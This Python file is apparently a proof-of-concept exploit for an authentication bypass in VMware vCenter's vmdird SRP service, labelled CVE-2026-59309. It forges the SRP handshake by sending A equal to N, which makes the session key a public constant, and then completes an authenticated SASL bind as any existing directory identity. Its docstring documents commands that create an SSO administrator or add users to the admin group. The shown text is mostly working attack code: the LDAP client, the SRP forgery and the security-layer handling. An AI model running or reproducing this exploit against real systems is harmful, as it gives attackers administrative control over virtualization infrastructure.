#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-59309 - VMware vCenter: authentication bypass in vmdird (SRP).

The vmdird cyrus-sasl SRP server only validates "A <= 0" at step 2 and
does not reject A == 0 (mod N) as RFC 5054 requires. By sending A = N:

    u = H(A | B)
    S = (A * v^u)^b mod N = 0        (because A mod N == 0)
    K = SHA1(i2b(S)) = SHA1(b"")     <- public constant

With K known and everything else public, M1 is forged and the SASL bind
succeeds for any identity that exists in the directory. From there the
LDAP channel allows search/add/modify -- including creating an SSO
administrator or changing a password.

Usage:
    python3 poc_vcenter.py -t 192.0.2.10 --check
    python3 poc_vcenter.py -t 192.0.2.10 --enum
    python3 poc_vcenter.py --self-test

    # create an administrator (add -> UPN -> group, one session per PDU)
    python3 poc_vcenter.py -t 192.0.2.10 --create-admin \
        --new-user svcbackup --new-pass "$NEW_PASS"

    # bind an existing user to the administrative group
    python3 poc_vcenter.py -t 192.0.2.10 --group-add svcbackup

    # SASL layer diagnostics (does not change the attack, only observes)
    python3 poc_vcenter.py -t 192.0.2.10 --check --capture cap.jsonl
    python3 poc_vcenter.py --analyze cap.jsonl

Limitation observed in vmdird 8.0.3 (build-24322831), not a property of
the attack itself:
- the server accepts ONE wrapped client PDU per session; from the second
  one on, the MAC it expects is no longer HMAC(K, ct|u32be(seq)) and the
  connection drops. That is why --enum issues a single broad search (the
  server returns the whole directory in it) and every other action uses a
  single PDU;
- the MAC on the server's own records verifies for the first record (seq 0)
  but not for the following ones, for the same HMAC state reason. The
  client decrypts them anyway, so --mac-in warn keeps the session alive.
"""
from __future__ import annotations

import argparse
import hashlib
import hmac
import json
import os
import re
import secrets
import socket
import ssl
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from xml.sax.saxutils import escape

# ---------------------------------------------------------------------------
# SRP group (RFC 5054, 1024 bits) -- the client only needs N and g
# ---------------------------------------------------------------------------
N_1024 = int(
    "EEAF0AB9ADB38DD69C33F80AFA8FC5E86072618775FF3C0B9EA2314C9C256576"
    "D674DF7496EA81D3383B4813D692C6E0E0D5D8E250B98BE48E495C1D6089DAD1"
    "5DC7D7B46154D6B6CE8EF4AD69B15D4982559B297BCF1885C529F566660E57EC"
    "68EDBC3C05726CC02FD4CBF4976EAA9AFD5138FE8376435B9FC61D2FC0EB06E3", 16)
G_1024 = 2

IDENT_DEFAULT = "administrator@vsphere.local"
BASE_DEFAULT = "dc=vsphere,dc=local"
SHA1_EMPTY = hashlib.sha1(b"").digest()


# ---------------------------------------------------------------------------
# wire capture (--capture) / offline analysis (--analyze)
# ---------------------------------------------------------------------------
_CAP = {"fh": None, "path": None}


def cap_start(path: str):
    """Open the jsonl file that records all binary traffic of the session."""
    _CAP["fh"] = open(path, "a", encoding="utf-8")
    _CAP["path"] = path


def cap_stop():
    fh = _CAP["fh"]
    _CAP["fh"] = None
    if fh:
        try:
            fh.close()
        except OSError:
            pass


def cap_write(obj: dict):
    """Write an event (session/layer/io) to the jsonl, when capture is on.

    What goes into the file is the raw wire, before any interpretation: it is
    what allows redoing the layer analysis offline, without repeating the attack.
    """
    fh = _CAP["fh"]
    if not fh:
        return
    obj = dict(obj)
    obj["t"] = round(time.time(), 3)
    fh.write(json.dumps(obj) + "\n")
    fh.flush()


# ---------------------------------------------------------------------------
# BER / LDAP
# ---------------------------------------------------------------------------
def ber_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def tlv(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + ber_len(len(content)) + content


def _int_content(v: int) -> bytes:
    if v == 0:
        return b"\x00"
    b = v.to_bytes((v.bit_length() + 7) // 8, "big")
    return b"\x00" + b if b[0] & 0x80 else b


def ber_int(v):
    return tlv(0x02, _int_content(v))


def ber_enum(v):
    return tlv(0x0A, _int_content(v))


def ber_str(b):
    if isinstance(b, str):
        b = b.encode()
    return tlv(0x04, b)


def ber_bool(v):
    return tlv(0x01, b"\xff" if v else b"\x00")


def ber_seq(*parts):
    return tlv(0x30, b"".join(parts))


def parse_tlv(data: bytes, off: int = 0):
    tag = data[off]
    off += 1
    n = data[off]
    off += 1
    if n & 0x80:
        nb = n & 0x7F
        n = int.from_bytes(data[off:off + nb], "big")
        off += nb
    return tag, data[off:off + n], off + n


def children(value: bytes):
    out, off = [], 0
    while off < len(value):
        tag, val, off = parse_tlv(value, off)
        out.append((tag, val))
    return out


class Ldap:
    """Minimal LDAP client over a socket (TLS optional)."""

    def __init__(self, host, port, use_tls=False, timeout=15):
        raw = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            raw = ctx.wrap_socket(raw, server_hostname=host)
        self.sock = raw
        self.msgid = 0
        self.debug = False
        self.layer = None       # SASL layer installed after the bind
        self._plain = b""       # decoded bytes not yet consumed

    def set_layer(self, layer):
        """Activate the SASL security layer from the next PDU onwards."""
        self.layer = layer
        if layer is not None:
            cap_write({"ev": "layer", "K": layer.K.hex(),
                       "enc_iv": layer.enc_iv.hex(), "dec_iv": layer.dec_iv.hex(),
                       "integ": layer.integ, "conf": layer.conf,
                       "mac": layer.mac_over, "pad": int(layer.pad),
                       "seq0": layer.seq_base})

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass

    def send(self, op: bytes, wrap: bool = True):
        self.msgid += 1
        data = tlv(0x30, ber_int(self.msgid) + op)
        use_layer = wrap and self.layer is not None
        wire = self.layer.wrap(data) if use_layer else data
        if self.debug:
            extra = f" layer={len(wire)}B" if use_layer else ""
            print(f"    -> msgid={self.msgid} op=0x{op[0]:02x} {len(data)}B{extra} "
                  f"{data[:48].hex()}")
        cap_write({"ev": "io", "dir": "out", "layer": use_layer,
                   "msgid": self.msgid, "hex": wire.hex()})
        self.sock.sendall(wire)

    def recv(self, auto_plain: bool = False):
        """Read one LDAPMessage and return (msgid, operation_tag, content).

        `auto_plain` accepts a cleartext response even with the layer armed:
        the final ack of the csrp bind is sent before the server installs
        the layer, so its response may come back without the layer.
        """
        plain = False
        if auto_plain and self.layer is not None and not self._plain:
            chunk = b""
            while not chunk:
                chunk = self._recv(False)
                if not chunk:
                    raise ConnectionError("connection closed by the server")
            if chunk[0] == 0x30:              # cleartext LDAPMessage
                plain = True
                self._plain = chunk
            else:
                self._plain = self.layer.unwrap(chunk)
        head = self._read(2, plain)
        n = head[1]
        if n & 0x80:
            nb = n & 0x7F
            n = int.from_bytes(self._read(nb, plain), "big")
        body = self._read(n, plain)
        if plain and self._plain:
            # whatever is left is already layer traffic
            rest, self._plain = self._plain, b""
            self._plain = self.layer.unwrap(rest) if self.layer else rest
        if self.debug:
            print(f"    <- {len(body)}B {body[:48].hex()}")
        kids = children(body)
        if len(kids) < 2:
            raise ValueError(f"malformed LDAPMessage: {body[:32].hex()}")
        return int.from_bytes(kids[0][1], "big"), kids[1][0], kids[1][1]

    def _recv(self, plain: bool) -> bytes:
        """recv() that records the raw bytes into --capture."""
        chunk = self.sock.recv(65536)
        if chunk:
            cap_write({"ev": "io", "dir": "in",
                       "layer": bool(self.layer is not None and not plain),
                       "hex": chunk.hex()})
        return chunk

    def _read(self, n: int, plain: bool = False) -> bytes:
        while len(self._plain) < n:
            chunk = self._recv(plain)
            if not chunk:
                raise ConnectionError("connection closed by the server")
            if self.layer is not None and not plain:
                self._plain += self.layer.unwrap(chunk)
            else:
                self._plain += chunk
        out, self._plain = self._plain[:n], self._plain[n:]
        return out


def op_bind_sasl(creds: bytes | None):
    body = ber_str(b"SRP")
    if creds is not None:
        body += ber_str(creds)
    return tlv(0x60, ber_int(3) + ber_str(b"") + tlv(0xA3, body))


def op_bind_simple(dn=b"", pw=b""):
    return tlv(0x60, ber_int(3) + ber_str(dn) + tlv(0x80, pw))


def op_search(base: str, scope=2, flt="(objectClass=*)", attrs=None):
    if flt in ("(objectClass=*)", "", None):
        f = tlv(0x87, b"objectClass")
    else:
        attr, _, value = flt.strip().lstrip("(").rstrip(")").partition("=")
        f = tlv(0xA3, ber_str(attr) + ber_str(value))
    attrlist = ber_seq(b"".join(ber_str(a) for a in (attrs or [])))
    body = (ber_str(base) + ber_int(scope) + ber_int(0) + ber_int(0) +
            ber_int(0) + ber_bool(False) + f + attrlist)
    return tlv(0x63, body)


def op_add(dn: str, attrs):
    lst = b"".join(
        tlv(0x30, ber_str(t) + tlv(0x31, b"".join(ber_str(v) for v in vs)))
        for t, vs in attrs)
    return tlv(0x68, ber_str(dn) + tlv(0x30, lst))


def op_modify(dn: str, changes):
    lst = b""
    for op, t, vs in changes:
        lst += tlv(0x30, ber_enum(op) +
                   tlv(0x30, ber_str(t) +
                       tlv(0x31, b"".join(ber_str(v) for v in vs))))
    return tlv(0x66, ber_str(dn) + tlv(0x30, lst))


def op_delete(dn: str):
    return tlv(0x4A, dn.encode())


def parse_result(val: bytes):
    code, diag = None, ""
    for i, (tag, v) in enumerate(children(val)):
        if tag == 0x0A and code is None:
            code = int.from_bytes(v, "big")
        elif tag == 0x04 and i != 1:
            diag = v.decode("utf-8", "replace")
    return code, diag


def parse_bind_response(val: bytes):
    code, diag, creds = None, "", None
    for i, (tag, v) in enumerate(children(val)):
        if tag == 0x0A and code is None:
            code = int.from_bytes(v, "big")
        elif tag == 0x87:
            creds = v
        elif tag == 0x04 and i != 1:
            diag = v.decode("utf-8", "replace")
    return code, diag, creds


def collect_search(conn: Ldap):
    entries = []
    while True:
        _, tag, val = conn.recv()
        if tag == 0x64:
            kids = children(val)
            dn = kids[0][1].decode("utf-8", "replace") if kids else ""
            attrs: dict[str, list[str]] = {}
            if len(kids) > 1:
                for _t, av in children(kids[1][1]):
                    parts = children(av)
                    if len(parts) != 2:
                        continue
                    name = parts[0][1].decode("utf-8", "replace")
                    vals = [v.decode("utf-8", "replace")
                            for _vt, v in children(parts[1][1])]
                    attrs.setdefault(name, []).extend(vals)
            entries.append((dn, attrs))
        elif tag == 0x65:
            return entries, parse_result(val)[0]


# option negotiation + security layer (cyrus-sasl SRP)
# ---------------------------------------------------------------------------
def parse_server_options(L: str) -> dict:
    """Parse the challenge L string (cyrus-sasl format, comma separated)."""
    out = {"mda": [], "integrity": [], "confidentiality": [], "flags": [],
           "mandatory": [], "maxbuf": 0}
    for part in (p.strip() for p in re.split(r"[,\s]+", L.strip())):
        if not part:
            continue
        key, _, val = part.partition("=")
        key, val = key.strip().lower(), val.strip()
        if key in ("mda", "integrity", "confidentiality"):
            out[key].append(val.upper())
        elif key == "mandatory":
            out["mandatory"].append(val.lower())
        elif key == "maxbuffersize":
            try:
                out["maxbuf"] = int(val)
            except ValueError:
                pass
        else:
            out["flags"].append(key)
    return out


def negotiate_options(L: str, policy: str = "auto") -> tuple[str, dict]:
    """Build the client option string honouring the server mandatory flags."""
    o = parse_server_options(L)
    parts = []
    mda = "SHA-1" if ("SHA-1" in o["mda"] or not o["mda"]) else o["mda"][0]
    parts.append(f"mda={mda}")
    integ = conf = None
    if "integrity" in o["mandatory"] or policy in ("auto", "integrity", "conf"):
        if o["integrity"]:
            integ = "HMAC-SHA-1" if "HMAC-SHA-1" in o["integrity"] else o["integrity"][0]
            parts.append(f"integrity={integ}")
    if "confidentiality" in o["mandatory"] or policy in ("auto", "conf"):
        if o["confidentiality"]:
            conf = "AES" if "AES" in o["confidentiality"] else o["confidentiality"][0]
            parts.append(f"confidentiality={conf}")
    if "replay_detection" in o["mandatory"] or "replay_detection" in o["flags"]:
        parts.append("replay_detection")
    return ",".join(parts), {"mda": mda, "integrity": integ, "conf": conf,
                             "maxbuf": o["maxbuf"], "mandatory": o["mandatory"]}


# --- AES-128 (core, for OFB) ----------------------------------------------
def _aes_sbox() -> list[int]:
    p = q = 1
    sbox = [0] * 256
    while True:
        p = (p ^ ((p << 1) & 0xFF) ^ (0x1B if p & 0x80 else 0)) & 0xFF
        q ^= (q << 1) & 0xFF
        q ^= (q << 2) & 0xFF
        q ^= (q << 4) & 0xFF
        q &= 0xFF
        if q & 0x80:
            q ^= 0x09
        x = q
        for s in (1, 2, 3, 4):
            x ^= ((q << s) | (q >> (8 - s))) & 0xFF
        sbox[p] = (x ^ 0x63) & 0xFF
        if p == 1:
            break
    sbox[0] = 0x63
    return sbox


_SBOX = _aes_sbox()


def _xtime(a: int) -> int:
    a <<= 1
    return (a ^ 0x1B) & 0xFF if a & 0x100 else a


def _aes_keys(key: bytes) -> list[list[int]]:
    w = [list(key[i:i + 4]) for i in range(0, 16, 4)]
    rcon = 1
    for i in range(4, 44):
        t = list(w[i - 1])
        if i % 4 == 0:
            t = [_SBOX[b] for b in t[1:] + t[:1]]
            t[0] ^= rcon
            rcon = _xtime(rcon)
        w.append([w[i - 4][j] ^ t[j] for j in range(4)])
    return w


def _aes_encrypt_block(rk: list[list[int]], block: bytes) -> bytes:
    s = [block[i] ^ rk[i // 4][i % 4] for i in range(16)]
    for rnd in range(1, 11):
        s = [_SBOX[b] for b in s]
        s = [s[4 * ((c + r) % 4) + r] for c in range(4) for r in range(4)]  # ShiftRows
        if rnd != 10:                                                      # MixColumns
            m = []
            for c in range(4):
                a = s[4 * c:4 * c + 4]
                m += [_xtime(a[0]) ^ _xtime(a[1]) ^ a[1] ^ a[2] ^ a[3],
                      a[0] ^ _xtime(a[1]) ^ _xtime(a[2]) ^ a[2] ^ a[3],
                      a[0] ^ a[1] ^ _xtime(a[2]) ^ _xtime(a[3]) ^ a[3],
                      _xtime(a[0]) ^ a[0] ^ a[1] ^ a[2] ^ _xtime(a[3])]
            s = m
        s = [s[i] ^ rk[4 * rnd + i // 4][i % 4] for i in range(16)]
    return bytes(s)


class AesOfb:
    """Continuous OFB stream (the keystream carries over from one PDU to the next)."""

    def __init__(self, key: bytes, iv: bytes):
        self.rk = _aes_keys(key)
        self.state = bytes(iv) + bytes(max(0, 16 - len(iv)))
        self.state = self.state[:16]
        self.ks = b""

    def apply(self, data: bytes) -> bytes:
        out = bytearray()
        for b in data:
            if not self.ks:
                self.state = _aes_encrypt_block(self.rk, self.state)
                self.ks = self.state
            out.append(b ^ self.ks[0])
            self.ks = self.ks[1:]
        return bytes(out)


class SrpLayer:
    """SRP session layer from cyrus-sasl (plugins/srp.c), which vmdird enables.

    Each record on the wire, exactly as srp_encode()/srp_decode_packet():

        u32be(len(ct) + 20) | ct | HMAC-SHA1(K, ct | u32be(seq))

    - the 4B prefix covers the ciphertext *and* the MAC (`tmpnum = outputlen - 4`);
    - `ct` is the same size as the plaintext: the AES is `aes-128-ofb`, a
      stream mode, so EVP_EncryptFinal adds no padding block at all
      (SRP_MAXBLOCKSIZE in srp_encode() only reserves space);
    - the HMAC key is the whole K (20B = SHA1(S)); the AES key is K[:16];
    - the OFB keystream is continuous across records, because the EVP
      context persists;
    - `seq` starts at 0 and is folded into the HMAC, but never travels on
      the wire.

    The IV direction is inverted relative to the variable names: the
    client LayerInit() receives (enc_IV=sIV, dec_IV=cIV) and the server one
    (enc_IV=cIV, dec_IV=sIV) -- the encrypting side uses the peer IV.
    """

    def __init__(self, K: bytes, integ=None, conf=None, enc_iv=b"", dec_iv=b"",
                 mac_over="cipher", seq_base=0, pad=False, seq_auto=True,
                 mac_in="strict", log=None):
        self.K = bytes(K)
        self.integ = (integ or "").upper()
        self.conf = (conf or "").upper()
        self.enc_iv = bytes(enc_iv)
        self.dec_iv = bytes(dec_iv)
        self.mac_over = mac_over or "cipher"
        self.pad = pad
        self.seq_base = seq_base if isinstance(seq_base, int) else 0
        self.seq_out = self.seq_base
        self.seq_in = self.seq_base
        self.seq_auto = seq_auto
        self.mac_in = (mac_in or "strict").lower()
        self.mac_in_fail = 0
        self.seq_shift_in = 0
        self.log = log
        self.enc = self._mk(self.enc_iv)
        self.dec = self._mk(self.dec_iv)
        self.raw = b""
        self.sent = 0
        self.got = 0

    def _mk(self, iv: bytes):
        if not self.conf:
            return None
        return AesOfb(self.K[:16], iv)

    def active(self) -> bool:
        return bool(self.integ or self.conf)

    def describe(self) -> str:
        return (f"integ={self.integ or '-'} conf={self.conf or '-'} "
                f"mac={self.mac_over} pad={int(self.pad)} seq0={self.seq_base} "
                f"mac_in={self.mac_in}")

    @staticmethod
    def _pad(data: bytes) -> bytes:
        n = 16 - (len(data) % 16)
        return data + bytes([n]) * n

    @staticmethod
    def _unpad(data: bytes) -> bytes:
        if not data:
            return data
        n = data[-1]
        if 1 <= n <= 16 and data[-n:] == bytes([n]) * n:
            return data[:-n]
        raise ValueError("invalid PKCS#7 padding in the SRP layer")

    def _mac_input(self, body: bytes, plain: bytes, seq: int) -> bytes:
        base = plain if self.mac_over == "plain" else body
        return base + seq.to_bytes(4, "big")

    def _mac(self, body: bytes, plain: bytes, seq: int) -> bytes:
        return hmac.new(self.K, self._mac_input(body, plain, seq),
                        hashlib.sha1).digest()

    def _check_in(self, body: bytes, plain: bytes, mac: bytes):
        """Check the MAC of a server record and return (ok, seq_used).

        If `seq_auto` is on and the expected sequence does not verify, it
        looks around for the sequence the server actually used (vmdird does
        not necessarily number records like cyrus) and adopts that fix.
        """
        seq = self.seq_in
        if hmac.compare_digest(self._mac(body, plain, seq), mac):
            return True, seq
        if self.seq_auto:
            for delta in (1, -1, 2, -2, 3, -3, 4, -4):
                cand = (seq + delta) % (2 ** 32)
                if hmac.compare_digest(self._mac(body, plain, cand), mac):
                    self.seq_shift_in += delta
                    if self.log:
                        self.log(f"    [!] seq_in: the server used {cand} where "
                                 f"the client expected {seq} (shift {delta:+d}); adopting")
                    return True, cand
        if self.mac_in == "warn":
            # Decryption is still valid; what does not verify is the
            # reconstruction of the server HMAC. It does not drop the
            # session: log it and move on, because the server does not
            # depend on the client verifying its MAC.
            self.mac_in_fail += 1
            if self.log and self.mac_in_fail == 1:
                self.log(f"    [!] incoming MAC of record #{self.got} does not "
                         f"verify (expected seq={seq}); continuing without "
                         "checking server-side integrity (further warnings hidden)")
            return True, seq
        return False, seq

    def wrap(self, pdu: bytes) -> bytes:
        body = pdu
        if self.enc:
            body = self.enc.apply(self._pad(pdu) if self.pad else pdu)
        mac = b""
        if self.integ:
            mac = hmac.new(self.K, self._mac_input(body, pdu, self.seq_out),
                           hashlib.sha1).digest()
            self.seq_out = (self.seq_out + 1) % (2 ** 32)
        self.sent += 1
        return (len(body) + len(mac)).to_bytes(4, "big") + body + mac

    def unwrap(self, data: bytes) -> bytes:
        """Consume bytes from the socket and return what is already decoded.

        Always reuse the same object across reads: the OFB keystream is
        continuous and the sequence counters advance per record.
        """
        self.raw += data
        out = b""
        mlen = 20 if self.integ else 0
        while len(self.raw) >= 4:
            total = int.from_bytes(self.raw[:4], "big")
            if total < mlen or total > 0xFFFFFF:
                raise ValueError(f"invalid SRP record length: {total}")
            if len(self.raw) < 4 + total:
                break
            body = self.raw[4:4 + total - mlen]
            mac = self.raw[4 + total - mlen:4 + total]
            plain = None
            used = self.seq_in
            if self.integ and self.mac_over != "plain" and self.mac_in != "off":
                okm, used = self._check_in(body, body, mac)
                if not okm:
                    raise ValueError(self._bad_mac(body, mac))
            if self.dec:
                plain = self.dec.apply(body)
                plain = self._unpad(plain) if self.pad else plain
            else:
                plain = body
            if self.integ and self.mac_over == "plain" and self.mac_in != "off":
                okm, used = self._check_in(body, plain, mac)
                if not okm:
                    raise ValueError(self._bad_mac(body, mac))
            if self.integ:
                self.seq_in = (used + 1) % (2 ** 32)
            self.got += 1
            out += plain
            self.raw = self.raw[4 + total:]
        return out

    def _bad_mac(self, body: bytes, mac: bytes = b"") -> str:
        want = self._mac(body, body, self.seq_in)
        return ("SRP layer MAC mismatch "
                f"({self.describe()}, seq_expected={self.seq_in}, "
                f"record#{self.got}); len={len(body)} "
                f"ct={body[:64].hex()} "
                f"mac_received={mac.hex()} mac_computed={want.hex()}")


# ---------------------------------------------------------------------------
# SRP client -- the bypass
# ---------------------------------------------------------------------------
def i2b(x: int) -> bytes:
    return b"" if x == 0 else x.to_bytes((x.bit_length() + 7) // 8, "big")


def f_s(x) -> bytes:      # utf8: 2 bytes, length
    b = x.encode() if isinstance(x, str) else x
    return len(b).to_bytes(2, "big") + b


def f_o(b: bytes) -> bytes:   # octet-string: 1 length byte
    return bytes([len(b)]) + b


def f_m(x: int) -> bytes:     # mpi: 2 bytes, length
    b = i2b(x)
    return len(b).to_bytes(2, "big") + b


def f_frame(payload: bytes) -> bytes:
    return len(payload).to_bytes(4, "big") + payload


def _strip_prefix(data: bytes) -> bytes:
    if len(data) >= 4 and int.from_bytes(data[:4], "big") == len(data) - 4:
        return data[4:]
    return data


def parse_challenge(creds: bytes):
    """Extract (N, g, salt, B, L) from the server challenge.

    Offset tolerant: vmdird has been seen both with and without a leading
    0x00 byte.
    """
    data = _strip_prefix(creds)
    last = None
    for start in (0, 1, 2):
        try:
            off = start
            N, off = _rd_mpi(data, off)
            g, off = _rd_mpi(data, off)
            salt, off = _rd_os(data, off)
            B, off = _rd_mpi(data, off)
            L, off = _rd_s(data, off)
        except Exception as exc:  # noqa: BLE001
            last = exc
            continue
        if N.bit_length() < 512 or g <= 1 or B == 0 or len(salt) > 128:
            last = ValueError("implausible SRP parameters")
            continue
        if len(L) > 512:
            last = ValueError("server options too long")
            continue
        return N, g, salt, B, L
    raise ValueError(f"unrecognized SRP challenge ({last})")


def _rd_mpi(data, off):
    n = int.from_bytes(data[off:off + 2], "big")
    return int.from_bytes(data[off + 2:off + 2 + n], "big"), off + 2 + n


def _rd_os(data, off):
    n = data[off]
    return data[off + 1:off + 1 + n], off + 1 + n


def _rd_s(data, off):
    n = int.from_bytes(data[off:off + 2], "big")
    return data[off + 2:off + 2 + n], off + 2 + n


def build_m1(identity: bytes, salt: bytes, A: int, B: int, L_raw: bytes,
             N: int, g: int) -> bytes:
    H = lambda b: hashlib.sha1(b).digest()  # noqa: E731
    Ng = bytes(a ^ b for a, b in zip(H(i2b(N)), H(i2b(g))))
    return H(Ng + H(identity) + salt + i2b(A) + i2b(B) + SHA1_EMPTY +
             H(identity) + H(L_raw))


def build_m2(M1: bytes, A: int, identity: bytes, opts: str, sid: bytes,
             ttl: int) -> bytes:
    H = lambda b: hashlib.sha1(b).digest()  # noqa: E731
    return H(i2b(A) + M1 + SHA1_EMPTY + H(identity) + H(opts.encode()) +
             sid + ttl.to_bytes(4, "big"))


def _parse_finals(creds: bytes) -> list[dict]:
    """Parse the final BindResponse fields across every plausible layout.

    The layout of the final fields is not consistent across
    implementations: some use size-prefixed octet strings ("os"), others
    send raw M2(20) + sIV(16) + sid + ttl(4). Since the resulting M2 can be
    verified, the verification decides the correct layout, not the parser.
    """
    body = _strip_prefix(creds)
    out = []

    # (a) length-prefixed fields: %o M2, %o sIV, %s sid, 4B ttl
    try:
        off = 0
        M2, off = _rd_os(body, off)
        sIV, off = _rd_os(body, off)
        sid, off = _rd_s(body, off)
        ttl = int.from_bytes(body[off:off + 4], "big")
        off += 4
        if off == len(body) and len(M2) == 20:
            out.append({"layout": "os", "M2": M2, "sIV": sIV, "sid": sid,
                        "ttl": ttl})
    except Exception:  # noqa: BLE001
        pass

    # (b) prefixed M2, raw sIV/sid/ttl
    try:
        M2, off = _rd_os(body, 0)
        if len(M2) == 20 and len(body) - off >= 20:
            sIV = body[off:off + 16]
            tail = body[off + 16:]
            if len(tail) >= 4:
                out.append({"layout": "os-raw", "M2": M2, "sIV": sIV,
                            "sid": tail[:-4],
                            "ttl": int.from_bytes(tail[-4:], "big")})
    except Exception:  # noqa: BLE001
        pass

    # (c) all raw: M2(20) + sIV(16) + sid + ttl(4)
    if len(body) >= 40:
        out.append({"layout": "raw", "M2": body[:20], "sIV": body[20:36],
                    "sid": body[36:-4],
                    "ttl": int.from_bytes(body[-4:], "big")})

    # (d) M2 only (no layer)
    try:
        M2, off = _rd_os(body, 0)
        if len(M2) == 20 and off == len(body):
            out.append({"layout": "m2-only", "M2": M2, "sIV": b"", "sid": b"",
                        "ttl": 0})
    except Exception:  # noqa: BLE001
        pass
    return out


def verify_m2(M2: bytes, M1: bytes, A: int, identity: bytes, opts: str,
              sid: bytes, ttl: int, sIV: bytes, N: int, g: int):
    """Test the known variants of the M2 formula.

    The formula is not unique across implementations: some include N^g,
    options, SID/TTL or the sIV. Returns (ok, variant_name).
    """
    H = lambda b: hashlib.sha1(b).digest()  # noqa: E731
    Ng = bytes(x ^ y for x, y in zip(H(i2b(N)), H(i2b(g))))
    base = i2b(A) + M1 + SHA1_EMPTY
    hi, ho = H(identity), H(opts.encode())
    tail = sid + ttl.to_bytes(4, "big")
    cand = {
        "csrp(A|M1|K|H(I)|H(o)|sid|ttl)": base + hi + ho + tail,
        "csrp+sIV": base + hi + ho + tail + sIV,
        "csrp+N^g": base + Ng + hi + ho + tail,
        "rfc5054(A|M1|K)": base,
    }
    for name, msg in cand.items():
        if hmac.compare_digest(H(msg), M2):
            return True, name
    return False, ""


def srp_bypass(conn: Ldap, identity: str, log=print, mac_variant="cipher",
               seq_base=0, ack_mode="empty", pad=False, seq_auto=True,
               mac_in="strict"):
    """Run the bypass. Returns (ok, reason, info)."""
    ident = identity.encode()

    step1 = f_frame(f_s(ident) + f_s(ident) + f_s(b"") + f_o(b""))
    conn.send(op_bind_sasl(step1))
    _, _tag, val = conn.recv()
    code, diag, creds = parse_bind_response(val)

    if code == 14 and not creds:      # some stacks return an empty 14 and want another step
        conn.send(op_bind_sasl(None))
        _, _tag, val = conn.recv()
        code, diag, creds = parse_bind_response(val)

    if code != 14 or not creds:
        low = diag.lower()
        if "no secret" in low or code == 49:
            return False, (f"identity has no SRP verifier (code={code} "
                           f"diag={diag}) -- use a user that exists in SSO"), {}
        return False, f"challenge not received (code={code} diag={diag})", {}

    N, g, salt, B, L_raw = parse_challenge(creds)
    L = L_raw.decode("utf-8", "replace")
    log(f"    N={N.bit_length()} bits  g={g}  salt={len(salt)}B  B={B.bit_length()} bits")
    if L:
        log(f"    server options: {L}")

    A = N                                   # <-- the bypass
    M1 = build_m1(ident, salt, A, B, L_raw, N, g)
    cIV = secrets.token_bytes(16)
    opts, sel = negotiate_options(L)
    if opts:
        log(f"    client options: {opts}")

    step2 = f_frame(f_m(A) + f_o(M1) + f_s(opts) + f_o(cIV))
    conn.send(op_bind_sasl(step2))
    _, _tag, val = conn.recv()
    code, diag, creds = parse_bind_response(val)

    # csrp "moot": the server returns M2/sIV/sid/ttl already with code=14
    # and only closes with code=0 after the client sends the final ack.
    # The real vmdird does exactly this (seen in build-24322831).
    moot = code == 14 and bool(creds)
    if code != 0 and not moot:
        low = diag.lower()
        if "a mod n" in low or "illegal value" in low:
            return False, f"TARGET PATCHED: A mod N validation present ({diag})", {}
        if code == 2:
            return False, ("bind refused (protocolError) -- this may be the "
                           "A mod N validation applied, or a different field "
                           f"layout; run with --debug: {diag}"), {}
        return False, f"bind failed code={code} diag={diag}", {}

    info = {"N_bits": N.bit_length(), "server_options": L, "identity": identity,
            "client_options": opts, "cIV": cIV.hex(), "M1": M1.hex(),
            "moot": moot}
    if not creds:
        return True, "bind accepted without final credentials (no layer)", info

    cands = _parse_finals(creds)
    if not cands:
        return True, "bind accepted (final response without parsable M2)", info

    # the correct layout is the one that makes M2 verify; if none does, the
    # first candidate wins and the session continues unverified.
    M2 = sIV = sid = None
    ttl = 0
    m2_ok, formula, layout = False, "", cands[0]["layout"]
    for c in cands:
        okf, name = verify_m2(c["M2"], M1, A, ident, opts, c["sid"], c["ttl"],
                              c["sIV"], N, g)
        if okf:
            M2, sIV, sid, ttl = c["M2"], c["sIV"], c["sid"], c["ttl"]
            m2_ok, formula, layout = True, name, c["layout"]
            break
    if M2 is None:
        c = next((x for x in cands if x["layout"] == "os"), cands[0])
        M2, sIV, sid, ttl = c["M2"], c["sIV"], c["sid"], c["ttl"]
        layout = c["layout"]
    note = "" if m2_ok else " (M2 not verified)"
    log(f"    final credentials: {len(creds)}B  layout={layout}{note}")
    info.update({"sIV": sIV.hex(), "sid": sid.hex(), "ttl": ttl,
                 "layout": layout, "m2_formula": formula or "unknown"})

    # client LayerInit: enc_IV=sIV (the server one), dec_IV=cIV (its own)
    layer = SrpLayer(SHA1_EMPTY, integ=sel["integrity"], conf=sel["conf"],
                     enc_iv=sIV, dec_iv=cIV, mac_over=mac_variant,
                     seq_base=seq_base, pad=pad, seq_auto=seq_auto,
                     mac_in=mac_in, log=log)
    if sIV and layer.active():
        conn.set_layer(layer)
        info["layer"] = (f"integ={sel['integrity'] or '-'} conf={sel['conf'] or '-'} "
                         f"mac={mac_variant} pad={int(pad)} seq0={seq_base} "
                         f"mac_in={mac_in}")
    else:
        info["layer"] = "inactive (server did not return sIV)"

    if moot:
        # Final ack. The layer only takes effect at code=0: the server does
        # not decode through the layer while the bind is in flight, and the
        # cyrus client sends this step with an empty clientout (cleartext).
        # The "wrapped" variants are for stacks that already decode here.
        wrapped = ack_mode.startswith("wrapped")
        ack = M2 if ack_mode.endswith("m2") else b""
        conn.send(op_bind_sasl(ack), wrap=wrapped)
        _, _tag, val = conn.recv(auto_plain=not wrapped)
        code2, diag2, _c2 = parse_bind_response(val)
        info["ack"] = ack_mode
        if code2 != 0:
            return False, (f"final ack refused (code={code2} diag={diag2}, "
                           f"ack={ack_mode}) -- M1 passed and credentials came back, "
                           "but the server did not close the bind"), info
        if not m2_ok:
            return True, ("SRP bypass OK (ack accepted); M2 did not match "
                          "the known formulas"), info
        return True, "SRP bypass OK, M2 verified and ack accepted -- authenticated SASL session", info

    if not m2_ok:
        return True, ("bind accepted; M2 did not match the known formulas "
                      "(layer active, session continues)"), info
    return True, "SRP bypass OK, M2 verified -- authenticated SASL session", info


# ---------------------------------------------------------------------------
